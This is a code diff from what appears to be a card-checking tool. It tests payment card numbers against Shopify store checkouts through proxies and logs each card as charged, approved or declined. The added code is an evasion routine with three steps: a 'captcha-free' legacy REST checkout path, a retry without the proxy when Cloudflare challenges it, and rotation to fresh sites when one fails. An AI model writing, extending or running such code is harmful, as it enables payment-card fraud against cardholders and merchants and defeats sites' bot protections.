@@ -245,7 +245,37 @@ async def check_card_async(cc: str, site: str, proxy: str) -> dict:
             _log.info("%s|%s|%s|%s", cc, response_str, _fmt_price(res.amount), res.currency or "?")
             return _build_response(res, cc=cc, site=cur_site, proxy=cur_proxy, proxy_dead=proxy_dead)
 
-        # any other step failure -> fresh site only (keep the caller's proxy)
+        # any other step failure -> legacy REST fallback, then direct, then fresh site
+        # (1) legacy_checkout (captcha-free REST path)
+        try:
+            leg = await auto_async_v2.legacy_checkout_entry(cur_site, cc, proxy_url)
+        except Exception:
+            leg = None
+        if leg and leg.get("status") in ("charged", "approved", "declined"):
+            _leg = {"charged": auto_async_v2.CheckStatus.CHARGED,
+                    "approved": auto_async_v2.CheckStatus.APPROVED,
+                    "declined": auto_async_v2.CheckStatus.DECLINED}[leg["status"]]
+            _leg_res = auto_async_v2.CheckResult(
+                card=cc, status=_leg, status_code=(leg.get("code") or "CARD_DECLINED").upper(),
+                amount="0.00", currency="USD", gateway=leg.get("gate", "") or "shopify_payments",
+                site_name=cur_site.replace("https://", "").replace("http://", ""),
+                shop_url=cur_site, receipt_url="", error=None, retryable=False)
+            _log.info("%s|%s|%s|%s", cc, (leg.get("code") or "CARD_DECLINED").upper(), "0.00", "USD")
+            return _build_response(_leg_res, cc=cc, site=cur_site, proxy=cur_proxy, proxy_dead=False)
+
+        # (2) direct retry (no proxy) when the challenge was proxy-triggered
+        if proxy_url and "CF_MANAGED_CHALLENGE" in err_text:
+            try:
+                res_direct = await auto_async_v2.run_checkout_for_card_async(cur_site, cc, "")
+            except Exception:
+                res_direct = None
+            if res_direct is not None:
+                _dc = (res_direct.status_code or "").strip().upper()
+                if res_direct.status != CheckStatus.ERROR or _dc in _REAL_RESULTS:
+                    _log.info("%s|%s|%s|%s", cc, _dc or _err_text(res_direct.error), _fmt_price(res_direct.amount), res_direct.currency or "?")
+                    return _build_response(res_direct, cc=cc, site=cur_site, proxy=cur_proxy, proxy_dead=False)
+
+        # (3) fresh site
         bad_sites.add(cur_site)
         cur_site = _next_site(cur_site, bad_sites)
         last_res = res
